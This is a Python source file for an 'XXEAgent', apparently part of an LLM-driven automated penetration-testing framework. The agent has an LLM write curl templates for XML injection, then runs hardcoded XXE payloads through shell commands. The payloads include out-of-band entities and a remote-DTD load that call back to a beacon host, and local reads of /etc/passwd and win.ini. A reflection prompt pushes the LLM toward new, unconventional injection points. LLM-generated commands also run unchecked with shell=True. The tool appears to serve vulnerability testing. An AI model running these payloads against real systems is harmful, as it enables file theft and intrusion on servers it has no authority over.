from typing import Dict, Any, List, Tuple
from pathlib import Path
import subprocess
import random
import string
import json
from attack_agent.request_utils import append_credentials_to_curl, check_beacon_detection
from config.llm_config import get_model_name, get_temperature
from attack_agent.request_utils import extract_useful_response

class XXEAgent:
    """
    XXE测试Agent（新版）

    工作流程：
    1. 调用LLM分析请求，识别XML注入点，生成带{PAYLOAD}的curl模板
    2. 生成统一token和beacon_url（用于OOB）
    3. 生成XXE payload列表（OOB + 通用文件读取）
       - 去掉 CTF 专用 payload（/app/flag.txt、php://filter、XInclude 等）
    4. 执行测试：
       - 保存 baseline 响应
       - 对每个 payload 执行并记录 stdout/stderr
    5. OOB 检测（beacon 回连）
    6. 如果 OOB 未命中，则调用 LLM 对响应做语义研判（是否存在 XXE 解析行为）
    7. 综合结论（只返回 vulnerable / not vulnerable）
    """

    def __init__(self, client,
                 xxe_prompt_path: str = "prompt/xxe_attack.txt",
                 xxe_judgment_prompt_path: str = "prompt/xxe_judgment.txt",
                 beacon_base: str = "http://172.17.0.1:9091/",
                 log_dir: str = "output/attack_logs/xxe",
                 reflection_enabled: bool = True):  # ✅ 新增：反思功能开关
        self.client = client
        self.xxe_prompt_path = Path(xxe_prompt_path)
        self.judgment_prompt_path = Path(xxe_judgment_prompt_path)
        self.beacon_base = beacon_base.rstrip("/") + "/"
        self.log_dir = Path(log_dir)
        self.log_dir.mkdir(parents=True, exist_ok=True)
        self._log_path = self.log_dir / "xxe_agent.log"
        self.reflection_enabled = reflection_enabled  # ✅ 保存配置

        # 记录所有执行的测试（用于延迟检测）
        self.execution_records: Dict[str, Dict[str, Any]] = {}  # {token: {url, evidence, ...}}

    def _log(self, *args):
        """统一日志函数"""
        msg = " ".join(str(a) for a in args)
        try:
            with open(self._log_path, "a", encoding="utf-8") as f:
                f.write(msg + "\n")
        except Exception:
            pass

    # === Prompt 加载 ===

    def _load_attack_prompt(self) -> str:
        """加载用于生成curl模板的XXE攻击prompt"""
        return self.xxe_prompt_path.read_text(encoding="utf-8")

    def _load_judgment_prompt(self) -> str:
        """加载用于XXE研判的prompt"""
        return self.judgment_prompt_path.read_text(encoding="utf-8")

    def _generate_token(self, length: int = 14) -> str:
        """生成随机token"""
        chars = string.ascii_letters + string.digits
        return ''.join(random.choice(chars) for _ in range(length))

    # === 对外主入口 ===

    def test(self, request: Dict[str, Any], credentials: Dict[str, Any]) -> Dict[str, Any]:
        """
        测试单个请求的XXE漏洞（两阶段版本）

        两阶段测试流程：
        - Stage 1: 初始攻击（使用原始prompt）
        - Stage 2: 反思攻击（如果Stage 1失败，基于失败分析生成新策略）

        Returns:
            {
              "vulnerable": True/False,
              "stage": 1 or 2,
              "beacon_url": str,
              "token": str,
              "curl_templates": List[str],
              "commands_executed": List[str],
              "evidence": List[Dict[str, str]],
              "llm_judgment": str,
              "summary": str
            }
        """
        # ========== Stage 1: 初始攻击 ==========
        self._log(f"\n{'='*70}")
        self._log(f"[STAGE 1: Initial Attack]")
        self._log(f"{'='*70}\n")

        result_stage1 = self._execute_stage1(request, credentials)

        # 如果检测到漏洞，直接返回
        if result_stage1.get("vulnerable") is True:
            self._log(f"\n[STAGE 1] ✓ VULNERABLE - Skipping Stage 2")
            return result_stage1

        # 如果未启用反思，直接返回Stage 1结果
        if not self.reflection_enabled:
            self._log(f"\n[Reflection] Disabled - Returning Stage 1 result")
            return result_stage1

        # ========== Stage 2: 反思攻击 ==========
        self._log(f"\n{'='*70}")
        self._log(f"[STAGE 2: Reflective Attack]")
        self._log(f"{'='*70}")
        self._log(f"[Reflection] Stage 1 did not detect vulnerability, starting reflection analysis...")
        self._log(f"")

        result_stage2 = self._execute_stage2(
            request=request,
            credentials=credentials,
            stage1_context=result_stage1
        )

        return result_stage2

    def _execute_stage1(self, request: Dict[str, Any], credentials: Dict[str, Any]) -> Dict[str, Any]:
        """
        执行Stage 1初始攻击

        Returns:
            Stage 1结果字典（包含test_results和llm_analysis用于反思）
        """
        method = request.get("method", "GET")
        url = request.get("url", "")

        self._log(f"\n{'='*70}")
        self._log(f"[XXE] New Test Started")
        self._log(f"{'='*70}")
        self._log(f"[XXE] Testing: {method} {url}")
        self._log(f"\n[Received from Planning Agent]:")
        self._log(f"  Target Request:")
        self._log(f"    Method: {method}")
        self._log(f"    URL: {url}")
        self._log(f"    Headers: {json.dumps(request.get('headers', {}), indent=6)}")
        self._log(f"    Body: {request.get('body', 'None')}")
        self._log(f"    Response Status: {request.get('response_status', 'N/A')}")
        original_response = str(request.get('response_body', '')) or ''
        extracted_response = extract_useful_response(original_response, max_length=2000)
        self._log(f"    Response Body (preview): {extracted_response}")
        self._log(f"  Credentials: {json.dumps(credentials, indent=6, default=str)}\n")

        # Step 1: 让LLM生成curl模板
        self._log(f"[Step 1: Calling LLM to Identify XML Injection Points]")
        curl_templates, llm_analysis = self._generate_curl_templates(request)  # ✅ 获取LLM分析输出

        if not curl_templates:
            self._log(f"[XXE] No injection points identified by LLM")
            return {
                "vulnerable": False,
                "stage": 1,  # ✅ 添加stage标记
                "token": None,
                "beacon_url": None,
                "curl_templates": [],
                "commands_executed": [],
                "test_results": [],  # ✅ 添加test_results
                "evidence": [],
                "llm_judgment": "No XML injection points found",
                "llm_analysis": llm_analysis,  # ✅ 保存LLM分析
                "summary": "No XML injection points found"
            }

        self._log(f"[LLM Generated {len(curl_templates)} curl template(s)]:")
        for i, tmpl in enumerate(curl_templates, 1):
            self._log(f"  {i}. {tmpl}")
        self._log("")

        # Step 2: 生成统一token & beacon URL
        token = self._generate_token()
        beacon_url = f"{self.beacon_base}?data={token}"
        self._log(f"[Step 2: Generated Token]: {token}")
        self._log(f"[Beacon URL]: {beacon_url}\n")

        # Step 3: 生成XXE payload列表（OOB + 通用文件读取；去掉CTF专用payload）
        xxe_payloads = self._build_xxe_payloads(beacon_url)
        self._log(f"[Step 3: Generated {len(xxe_payloads)} XXE Payloads]")
        for idx, (p_name, p_payload) in enumerate(xxe_payloads, 1):
            preview = p_payload.replace("\n", " ")[:120]
            self._log(f"  {idx}. [{p_name}] {preview}{'...' if len(p_payload) > 120 else ''}")
        self._log("")

        # Step 4: 执行测试 + 记录响应（不再做规则 in-band 检测）
        self._log(f"[Step 4: Executing Tests]")
        executed_commands: List[str] = []
        evidence: List[Dict[str, str]] = []
        test_results: List[Dict[str, Any]] = []

        # 先执行一个 baseline 请求（无 XXE 结构，只用普通字符串）
        # baseline_response = self._execute_baseline(curl_templates[0], credentials)
        # extracted_baseline = extract_useful_response(baseline_response, max_length=2000)
        # self._log(f"\n[Baseline Response (length={len(baseline_response)})]:")
        # self._log(f"  {extracted_baseline}")
        # self._log("")
        baseline_response = original_response

        for template in curl_templates:
            self._log(f"\n[Testing Template]: {template[:100]}...")
            template = self._ensure_xml_content_type(template)

            for payload_name, payload in xxe_payloads:
                if '{PAYLOAD}' not in template:
                    self._log("  ⚠️  Template missing {PAYLOAD} placeholder, skipping")
                    continue

                final_cmd = template.replace('{PAYLOAD}', payload)
                final_cmd = append_credentials_to_curl(final_cmd, credentials)

                # 打印完整命令（不截断）
                self._log(f"  [Payload: {payload_name}]")
                self._log(f"  [Command]: {final_cmd}")

                try:
                    process = subprocess.Popen(
                        final_cmd,
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True
                    )
                    stdout, stderr = process.communicate(timeout=12)
                    executed_commands.append(final_cmd)

                    # 解析HTTP状态码
                    from attack_agent.request_utils import parse_http_status_from_response
                    http_status, response_body = parse_http_status_from_response(stdout)

                    self._log(f"  ✓ Executed (curl_exit_code={process.returncode}, stdout_len={len(response_body)}, stderr_len={len(stderr)})")
                    if http_status is not None:
                        self._log(f"  HTTP Status: {http_status}")

                    extracted_body = ""
                    # 打印完整响应（不截断）
                    if response_body:
                        extracted_body = extract_useful_response(response_body, max_length=2000)
                        self._log("  [Response stdout (extracted)]:")
                        self._log("    " + extracted_body.replace("\n", "\n    "))
                    if stderr:
                        self._log("  [Response stderr]:")
                        self._log("    " + stderr.replace("\n", "\n    "))

                    # 记录给 LLM 分析用
                    test_results.append({
                        "payload_name": payload_name,
                        "payload": payload,
                        "response": extracted_body or "",
                        "stderr": stderr or "",
                        "status_code": process.returncode,
                    })

                except subprocess.TimeoutExpired:
                    self._log("  ✗ Timeout after 12s")
                except Exception as e:
                    self._log(f"  ✗ Exec error: {e}")

        # Step 5: OOB检测
        self._log(f"\n[Step 5: Checking Beacon Detection]")
        oob = check_beacon_detection(token)
        if oob:
            evidence.append({"type": "oob_hit", "snippet": f"token:{token}"})
            self._log("  ✓✓✓ OOB beacon detected!")
        else:
            self._log("  ✗ No OOB beacon detected")

        # Step 6: LLM 语义研判（只在 OOB 未命中的情况下真正需要，但这里统一调用并记录）
        self._log(f"\n[Step 6: LLM Semantic Judgment]")
        llm_judgment = self._llm_judge_responses(baseline_response, test_results)
        self._log(f"  LLM Judgment (preview): {llm_judgment[:200]}...")

        # 综合结论（只返回 True/False）
        vulnerable = self._determine_vulnerability(oob, llm_judgment)

        # 生成摘要
        summary = self._generate_summary(vulnerable, oob, llm_judgment, beacon_url)

        self._log(f"\n{'='*70}")
        self._log("[XXE Test Summary]")
        self._log(f"  Token: {token}")
        self._log(f"  Commands Executed: {len(executed_commands)}")
        self._log(f"  OOB: {'HIT' if oob else 'MISS'}")
        self._log(f"  Result: {'VULNERABLE' if vulnerable else 'NOT VULNERABLE'}")
        self._log(f"  Summary: {summary}")
        self._log(f"{'='*70}\n")

        # 记录执行信息（用于延迟检测）
        self.execution_records[token] = {
            "token": token,
            "beacon_url": beacon_url,
            "url": url,
            "method": method,
            "evidence": evidence
        }

        return {
            "vulnerable": vulnerable,  # True / False
            "stage": 1,  # ✅ 标记为Stage 1
            "beacon_url": beacon_url,
            "token": token,
            "curl_templates": curl_templates,  # ✅ 保存用于反思
            "commands_executed": executed_commands,
            "test_results": test_results,  # ✅ 保存用于反思
            "evidence": evidence,
            "llm_judgment": llm_judgment,
            "llm_analysis": llm_analysis,  # ✅ 保存LLM分析输出
            "summary": summary,
            "note": f"Stage 1 - Immediate detection: {'XXE confirmed' if vulnerable else 'Pending finalize'}"
        }

    # === 生成 curl 模板（沿用你原来的逻辑） ===

    def _generate_curl_templates(self, request: Dict[str, Any]) -> tuple:
        """
        调用LLM生成带{PAYLOAD}的curl模板

        Returns:
            (curl模板列表, LLM完整输出) 元组
        """
        sys_prompt = self._load_attack_prompt()
        original_response = str(request.get('response_body', '')) or ''
        extracted_response = extract_useful_response(original_response, max_length=2000)

        user_prompt = f"""REQUEST INFORMATION:
Method: {request.get('method', 'GET')}
URL: {request.get('url', '')}
Headers: {json.dumps(request.get('headers', {}), indent=2)}
Body: {json.dumps(request.get('body'), indent=2) if request.get('body') else 'None'}
Response Status: {request.get('response_status', 'N/A')}
Response Body (extracted): {extracted_response}

Please analyze this request and generate curl command templates with {{PAYLOAD}} placeholder for XXE testing.
"""

        self._log("\n[LLM INPUT - XXE Analysis Prompt]:")
        self._log("~" * 70)
        self._log(user_prompt)
        self._log("~" * 70 + "\n")

        try:
            completion = self.client.chat.completions.create(
                model=get_model_name("attack_agent"),
                messages=[
                    {"role": "system", "content": sys_prompt},
                    {"role": "user", "content": user_prompt},
                ],
                temperature=get_temperature("attack_agent")
            )
            llm_output = completion.choices[0].message.content

            self._log("[LLM OUTPUT - XXE Analysis Response]:")
            self._log("~" * 70)
            self._log(llm_output)
            self._log("~" * 70 + "\n")

            templates = self._parse_curl_templates(llm_output)
            return templates, llm_output  # ✅ 返回元组

        except Exception as e:
            self._log(f"[XXE] LLM call failed: {e}")
            import traceback
            self._log(traceback.format_exc())
            return [], ""  # ✅ 错误时返回空列表和空字符串

    def _parse_curl_templates(self, llm_output: str) -> List[str]:
        """
        从LLM输出中提取curl模板
        """
        templates: List[str] = []
        lines = llm_output.splitlines()

        commands_idx = -1
        for i, line in enumerate(lines):
            if 'command:' in line.lower() or 'commands:' in line.lower():
                commands_idx = i
                break

        if commands_idx == -1:
            # 容错：直接扫描所有行
            for line in lines:
                l = line.strip()
                if 'curl' in l and '{PAYLOAD}' in l:
                    templates.append(l.strip('`').strip())
            return templates

        # 从Commands:行开始提取
        for i in range(commands_idx + 1, len(lines)):
            line = lines[i].strip()
            if not line or line.startswith('```'):
                continue
            if 'curl' in line and '{PAYLOAD}' in line:
                templates.append(line.strip('`').strip())

        return templates

    def _ensure_xml_content_type(self, cmd: str) -> str:
        """
        若模板中未设置Content-Type，则补充application/xml
        """
        if "-H 'Content-Type:" in cmd or '-H "Content-Type:' in cmd:
            return cmd
        return f"{cmd} -H 'Content-Type: application/xml'"

    # === XXE payload 构造（去掉 CTF 专用 payload） ===

    def _build_xxe_payloads(self, beacon_url: str) -> List[Tuple[str, str]]:
        """
        生成XXE payload列表（包括OOB和通用文件读取）
        返回: [(payload_name, payload_xml), ...]
        """
        payloads: List[Tuple[str, str]] = []

        # OOB：外部实体（内联）
        payloads.append((
            "oob_inline_entity",
            f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "{beacon_url}">
]>
<root>&xxe;</root>"""
        ))

        # OOB：参数实体加载远程DTD
        payloads.append((
            "oob_external_dtd",
            f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % dtd SYSTEM "{beacon_url}xxe.dtd">
  %dtd;
]>
<root>test</root>"""
        ))

        # OOB：使用PUBLIC
        payloads.append((
            "oob_public_doctype",
            f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root PUBLIC "xxe" "{beacon_url}public">
<root>public-test</root>"""
        ))

        # In-band：文件读取（Linux /etc/passwd）
        payloads.append((
            "file_read_etc_passwd",
            """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>"""
        ))

        # In-band：文件读取（Linux /etc/hostname）
        payloads.append((
            "file_read_etc_hostname",
            """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<foo>&xxe;</foo>"""
        ))

        # In-band：文件读取（Windows win.ini）
        payloads.append((
            "file_read_win_ini",
            """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>
<foo>&xxe;</foo>"""
        ))

        # ✅ 已去掉 CTF 专用 payload：/app/flag.txt、XInclude、php://filter 等

        return payloads

    # === Baseline 请求 ===

    # def _execute_baseline(self, template: str, credentials: Dict[str, Any]) -> str:
    #     """
    #     执行baseline请求（无XXE结构）作为对照
    #     """
    #     try:
    #         # 用一个无害的普通字符串替换{PAYLOAD}
    #         baseline_cmd = template.replace('{PAYLOAD}', 'baseline_test')
    #         baseline_cmd = append_credentials_to_curl(baseline_cmd, credentials)

    #         process = subprocess.Popen(
    #             baseline_cmd,
    #             shell=True,
    #             stdout=subprocess.PIPE,
    #             stderr=subprocess.PIPE,
    #             text=True
    #         )
    #         stdout, _ = process.communicate(timeout=10)
    #         return stdout or ""
    #     except Exception as e:
    #         self._log(f"  ⚠️ Baseline request failed: {e}")
    #         return ""

    # === LLM 研判 ===

    def _llm_judge_responses(self, baseline: str, test_results: List[Dict[str, Any]]) -> str:
        """
        调用LLM进行语义研判：
        - 去重：按response前若干字符去重
        - 截断：最多保留前15个结果、每个response_preview截到2000字符
        """
        judgment_prompt = self._load_judgment_prompt()

        # 去重：按照 response[:2000] 简单去重
        seen = {}
        for r in test_results:
            resp = r["response"] or ""
            key = resp[:2000]
            if key not in seen:
                seen[key] = r

        deduped_results = list(seen.values())
        deduped_results = deduped_results[:15]

        results_summary = []
        for r in deduped_results:
            results_summary.append({
                "payload_name": r.get("payload_name"),
                "response_preview": extract_useful_response(r.get("response") or "", max_length=2000),  # ✅ 使用智能提取
                "response_length": len(r.get("response") or ""),
                "stderr_preview": (r.get("stderr") or "")[:500] if r.get("stderr") else None,
            })

        # ✅ 使用智能提取处理baseline响应
        baseline_extracted = extract_useful_response(baseline, max_length=2000)

        user_input = f"""BASELINE RESPONSE (length={len(baseline)}):
{baseline_extracted}

TEST RESULTS (showing {len(results_summary)} payloads after deduplication):
{json.dumps(results_summary, indent=2, ensure_ascii=False)}

Please analyze if these responses indicate an XXE vulnerability (XML External Entity).
Remember: even parser error messages about external entities/DOCTYPE should be considered evidence of vulnerability.
"""

        self._log("\n[LLM Judgment - Full Input to LLM]:")
        self._log("=" * 70)
        self._log("[System Prompt]:")
        self._log(judgment_prompt)
        self._log("\n[User Input]:")
        self._log(user_input)
        self._log("=" * 70)
        self._log("")

        try:
            completion = self.client.chat.completions.create(
                model=get_model_name("attack_agent"),
                messages=[
                    {"role": "system", "content": judgment_prompt},
                    {"role": "user", "content": user_input}
                ],
                temperature=get_temperature("attack_agent")
            )
            llm_output = completion.choices[0].message.content

            self._log("[LLM Judgment - Output]:")
            self._log("~" * 70)
            self._log(llm_output)
            self._log("~" * 70 + "\n")

            return llm_output

        except Exception as e:
            self._log(f"[XXE] LLM judgment failed: {e}")
            return "LLM judgment failed"

    def _extract_llm_judgment_flag(self, llm_judgment: str) -> str:
        """
        从 LLM 输出中提取最终 Judgment 标记（只看最后一次出现的 judgment）.

        返回:
            "vulnerable" / "not vulnerable" / None
        """
        if not llm_judgment:
            return None

        lower = llm_judgment.lower()
        idx = lower.rfind("judgment")
        if idx == -1:
            return None

        # 从最后一个 "judgment" 开始往后截取
        tail = lower[idx:]

        # 先看 "not vulnerable"，避免子串冲突
        if "not vulnerable" in tail:
            return "not vulnerable"

        # 再看 "vulnerable"
        if "vulnerable" in tail:
            return "vulnerable"

        return None

    def _determine_vulnerability(self, oob: bool, llm_judgment: str) -> bool:
        """
        综合判定是否存在XXE漏洞（只返回True/False）

        规则：
        - OOB命中 → True（最高置信度）
        - 否则根据 LLM 输出中的 Judgment 决定
        """
        if oob:
            return True

        flag = self._extract_llm_judgment_flag(llm_judgment)
        if flag == "vulnerable":
            return True
        if flag == "not vulnerable":
            return False

        # 没抽到 Judgment（LLM 输出不规范或失败），保守认为未发现漏洞
        return False


    def _generate_summary(self, vulnerable: bool, oob: bool, llm_judgment: str, beacon_url: str) -> str:
        """
        生成测试摘要
        """
        if oob and vulnerable:
            return f"XXE vulnerable (OOB beacon detected): {beacon_url}"

        if vulnerable:
            return "XXE vulnerable (LLM judgment based on parser behavior / responses)"

        # not vulnerable
        if "LLM judgment failed" in (llm_judgment or ""):
            return "No XXE evidence found (LLM judgment failed, defaulting to not vulnerable)"
        return "No XXE evidence found (LLM assessment)"

    # ========== Stage 2: 反思攻击方法 ==========

    def _execute_stage2(self, request: Dict[str, Any], credentials: Dict[str, Any],
                       stage1_context: Dict[str, Any]) -> Dict[str, Any]:
        """
        执行Stage 2反思攻击（XXE版）

        复用SSTI的反思逻辑，针对XXE场景调整
        """
        # 1. 构建反思suffix
        self._log(f"[Reflection] Building reflection analysis...")
        reflection_suffix = self._build_reflection_suffix(stage1_context)

        # 2. 调用LLM生成新模板
        self._log(f"[Step 1: Generating Reflection Templates via LLM]")
        new_templates, llm_reflection_output = self._generate_curl_templates_with_reflection(
            request=request,
            reflection_suffix=reflection_suffix
        )

        if not new_templates:
            self._log(f"[Reflection] LLM did not generate new templates, returning Stage 1 result")
            stage1_context["reflection_attempted"] = True
            stage1_context["reflection_note"] = "No new templates generated"
            return stage1_context

        self._log(f"[LLM Generated {len(new_templates)} new template(s)]:")
        for i, tmpl in enumerate(new_templates, 1):
            self._log(f"  {i}. {tmpl}")
        self._log(f"")

        # 3. 生成新的token
        token = self._generate_token()
        beacon_url = f"{self.beacon_base}?data={token}"
        self._log(f"[Step 2: Generated New Token]: {token}")
        self._log(f"[Beacon URL]: {beacon_url}")
        self._log(f"")

        # 4. 生成XXE payload列表
        xxe_payloads = self._build_xxe_payloads(beacon_url)
        self._log(f"[Step 3: Generated {len(xxe_payloads)} XXE Payloads]")
        for idx, (p_name, p_payload) in enumerate(xxe_payloads, 1):
            preview = p_payload.replace("\n", " ")[:120]
            self._log(f"  {idx}. [{p_name}] {preview}{'...' if len(p_payload) > 120 else ''}")
        self._log(f"")

        # 5. 执行测试
        self._log(f"[Step 4: Executing Tests]")
        executed_commands: List[str] = []
        test_results: List[Dict[str, Any]] = []
        evidence: List[Dict[str, str]] = []

        # 先执行baseline请求
        # baseline_response = self._execute_baseline(new_templates[0], credentials)
        # extracted_baseline = extract_useful_response(baseline_response, max_length=2000)
        # self._log(f"\n[Baseline Response (length={len(baseline_response)})]:")
        # self._log(f"  {extracted_baseline}")
        # self._log("")

        baseline_response = str(request.get('response_body', ''))

        for template in new_templates:
            self._log(f"\n[Testing Template]: {template[:100]}...")
            template = self._ensure_xml_content_type(template)

            for payload_name, payload in xxe_payloads:
                if '{PAYLOAD}' not in template:
                    self._log("  ⚠️  Template missing {PAYLOAD} placeholder, skipping")
                    continue

                final_cmd = template.replace('{PAYLOAD}', payload)
                final_cmd = append_credentials_to_curl(final_cmd, credentials)

                self._log(f"  [Payload: {payload_name}]")
                self._log(f"  [Command]: {final_cmd}")

                try:
                    process = subprocess.Popen(
                        final_cmd,
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True
                    )
                    stdout, stderr = process.communicate(timeout=12)
                    executed_commands.append(final_cmd)

                    from attack_agent.request_utils import parse_http_status_from_response
                    http_status, response_body = parse_http_status_from_response(stdout)

                    self._log(f"  ✓ Executed (curl_exit_code={process.returncode}, stdout_len={len(response_body)}, stderr_len={len(stderr)})")
                    if http_status is not None:
                        self._log(f"  HTTP Status: {http_status}")

                    extracted_body = ""
                    if response_body:
                        extracted_body = extract_useful_response(response_body, max_length=2000)
                        self._log("  [Response stdout (extracted)]:")
                        self._log("    " + extracted_body.replace("\n", "\n    "))
                    if stderr:
                        self._log("  [Response stderr]:")
                        self._log("    " + stderr.replace("\n", "\n    "))

                    test_results.append({
                        "payload_name": payload_name,
                        "payload": payload,
                        "response": extracted_body or "",
                        "stderr": stderr or "",
                        "status_code": process.returncode,
                    })

                except subprocess.TimeoutExpired:
                    self._log("  ✗ Timeout after 12s")
                except Exception as e:
                    self._log(f"  ✗ Exec error: {e}")

        # 6. OOB检测
        self._log(f"\n[Step 5: Checking Beacon Detection]")
        oob = check_beacon_detection(token)
        if oob:
            evidence.append({"type": "oob_hit", "snippet": f"token:{token}"})
            self._log("  ✓✓✓ OOB beacon detected!")
        else:
            self._log("  ✗ No OOB beacon detected")

        # 7. LLM语义研判
        self._log(f"\n[Step 6: LLM Semantic Judgment]")
        llm_judgment = self._llm_judge_responses(baseline_response, test_results)
        self._log(f"  LLM Judgment (preview): {llm_judgment[:200]}...")

        # 综合结论
        vulnerable = self._determine_vulnerability(oob, llm_judgment)

        # 生成摘要
        summary = self._generate_summary(vulnerable, oob, llm_judgment, beacon_url)

        self._log(f"\n{'='*70}")
        self._log("[XXE Test Summary - Stage 2]")
        self._log(f"  Token: {token}")
        self._log(f"  Commands Executed: {len(executed_commands)}")
        self._log(f"  OOB: {'HIT' if oob else 'MISS'}")
        self._log(f"  Result: {'VULNERABLE' if vulnerable else 'NOT VULNERABLE'} (detected in Stage 2)")
        self._log(f"  Summary: {summary}")
        self._log(f"{'='*70}\n")

        # 8. 记录执行信息
        method = request.get("method", "GET")
        url = request.get("url", "")
        self.execution_records[token] = {
            "token": token,
            "beacon_url": beacon_url,
            "url": url,
            "method": method,
            "evidence": evidence
        }

        # ✅ 在 return 语句中添加 stage1_results
        return {
            "vulnerable": vulnerable,
            "stage": 2,
            "beacon_url": beacon_url,
            "token": token,
            "curl_templates": new_templates,
            "commands_executed": executed_commands,
            "test_results": test_results,
            "evidence": evidence,
            "llm_judgment": llm_judgment,
            "llm_reflection_output": llm_reflection_output,
            "reflection_analysis": reflection_suffix,
            "summary": summary,
            # ✅ 新增：保留Stage 1的完整结果
            "stage1_results": {
                "test_results": stage1_context.get("test_results", []),
                "curl_templates": stage1_context.get("curl_templates", []),
                "commands_executed": stage1_context.get("commands_executed", []),
                "evidence": stage1_context.get("evidence", []),
                "llm_analysis": stage1_context.get("llm_analysis", ""),
                "llm_judgment": stage1_context.get("llm_judgment", "")
            },
            "note": f"Stage 2 - Reflection attack: {'XXE confirmed' if vulnerable else 'Not detected'}"
        }

    def _build_reflection_suffix(self, stage1_context: Dict[str, Any]) -> str:
        """
        构建XXE反思suffix
        """
        templates = stage1_context.get("curl_templates", [])
        test_results = stage1_context.get("test_results", [])
        vulnerable = stage1_context.get("vulnerable")

        suffix = "\n\n"
        suffix += "="*70 + "\n"
        suffix += "STAGE 1 RESULTS (Failed Detection)\n"
        suffix += "="*70 + "\n\n"

        # 1. 之前生成的模板
        suffix += "Previous Templates Generated:\n"
        for i, tmpl in enumerate(templates, 1):
            suffix += f"{i}. {tmpl}\n"
        suffix += "\n"

        # 2. 执行结果
        suffix += "Execution Results:\n"
        suffix += "-"*70 + "\n"

        sampled = self._sample_test_results(test_results, max_samples=10)

        for i, result in enumerate(sampled, 1):
            suffix += f"\nTest {i}:\n"
            suffix += f"  Payload: {result.get('payload_name', 'N/A')}\n"

            response = result.get('response', '')
            if response:
                extracted = extract_useful_response(response, max_length=2000)
                suffix += f"  Response (extracted):\n    {extracted}\n"

            if result.get('stderr'):
                suffix += f"  Stderr: {result.get('stderr', '')[:200]}\n"

        suffix += "\n"

        # 3. 结果说明
        suffix += f"Result: {'NOT VULNERABLE' if vulnerable is False else 'UNCERTAIN/PENDING'}\n"
        suffix += "\n"

        # 4. 反思任务说明
        suffix += "="*70 + "\n"
        suffix += "YOUR TASK FOR STAGE 2 - REFLECTION\n"
        suffix += "="*70 + "\n\n"

        suffix += """Based on the above failed XXE attempt, please:

1. **Analyze Why Stage 1 Failed**:
   - Was the injection point correct?
   - Did responses show XML parsing errors or filtering?
   - Were there error messages revealing protection mechanisms?
   - Did we test the right parameters/headers/body?

2. **Design NEW Injection Strategy**:
   - Try DIFFERENT injection points (different parameters, headers, paths, body fields)
   - Adjust request structure based on error messages
   - Consider alternative approaches (e.g., if URL parameter failed, try POST body with XML)

3. **Generate NEW Curl Command Templates**:
   - Use {PAYLOAD} placeholder (payload content will remain the same)
   - Focus on changing WHERE to inject XML, not WHAT to inject
   - You can modify field names, add/remove parameters, change headers, etc.
   - If previous templates tested URL parameters, try POST body or headers
   - If previous templates used GET, consider POST with Content-Type: application/xml

IMPORTANT:
- Keep the {PAYLOAD} placeholder unchanged
- Focus on changing injection points/request structure for XML
- Generate 3-5 NEW templates with DIFFERENT injection points
- Be creative - try unconventional injection points

Output Format (same as Stage 1):

Analysis:
<Your failure analysis and new strategy explanation>

Commands:
<curl command 1 with {PAYLOAD}>
<curl command 2 with {PAYLOAD}>
<curl command 3 with {PAYLOAD}>
...
"""

        return suffix

    def _generate_curl_templates_with_reflection(self, request: Dict[str, Any],
                                                 reflection_suffix: str) -> tuple:
        """
        调用LLM生成反思后的新XXE模板
        """
        sys_prompt = self._load_attack_prompt()
        original_response = str(request.get('response_body', '')) or ''
        extracted_response = extract_useful_response(original_response, max_length=2000)
        
        user_prompt = f"""REQUEST INFORMATION:
Method: {request.get('method', 'GET')}
URL: {request.get('url', '')}
Headers: {json.dumps(request.get('headers', {}), indent=2)}
Body: {json.dumps(request.get('body'), indent=2) if request.get('body') else 'None'}
Response Status: {request.get('response_status', 'N/A')}
Response Body (extracted): {extracted_response}

Please analyze this request and generate curl command templates with {{PAYLOAD}} placeholder for XXE testing.
"""

        # ✅ Append反思内容
        user_prompt += reflection_suffix

        self._log(f"\n[LLM INPUT - Reflection Prompt]:")
        self._log(f"{'~'*70}")
        self._log(f"{user_prompt}")
        self._log(f"{'~'*70}\n")

        try:
            completion = self.client.chat.completions.create(
                model=get_model_name("attack_agent"),
                messages=[
                    {"role": "system", "content": sys_prompt},
                    {"role": "user", "content": user_prompt},
                ],
                temperature=get_temperature("attack_agent")
            )

            llm_output = completion.choices[0].message.content

            self._log(f"[LLM OUTPUT - Reflection Response]:")
            self._log(f"{'~'*70}")
            self._log(f"{llm_output}")
            self._log(f"{'~'*70}\n")

            templates = self._parse_curl_templates(llm_output)
            return templates, llm_output

        except Exception as e:
            self._log(f"[Reflection] LLM call failed: {e}")
            import traceback
            self._log(traceback.format_exc())
            return [], ""

    def _sample_test_results(self, test_results: List[Dict], max_samples: int = 10) -> List[Dict]:
        """
        从测试结果中采样（去重 + 采样）
        """
        if not test_results:
            return []

        # 按响应哈希去重
        seen = {}
        for r in test_results:
            resp = r.get("response", "")
            key = resp[:500] if resp else "empty"
            if key not in seen:
                seen[key] = r

        deduped = list(seen.values())

        # 采样
        if len(deduped) <= max_samples:
            return deduped
        else:
            import random
            return random.sample(deduped, max_samples)

    # === 延迟检查 OOB 结果（沿用原逻辑） ===

    def check_final_results(self) -> Dict[str, bool]:
        """检查最终结果（统一延迟检测）"""
        self._log(f"\n{'='*70}")
        self._log(f"[XXE] Checking Final Results")
        self._log(f"{'='*70}\n")

        updates = {}

        for token in self.execution_records.keys():
            is_vulnerable = check_beacon_detection(token)
            updates[token] = is_vulnerable

            if is_vulnerable:
                self._log(f"  ✓ Token {token}: VULNERABLE (detected in beacon log)")
            else:
                self._log(f"  ✗ Token {token}: SAFE (not in beacon log)")

        self._log(f"\n[XXE] Final Summary:")
        successful = sum(1 for v in updates.values() if v)
        self._log(f"  Total tests: {len(updates)}")
        self._log(f"  Successful XXE: {successful}")
        self._log(f"{'='*70}\n")

        return updates
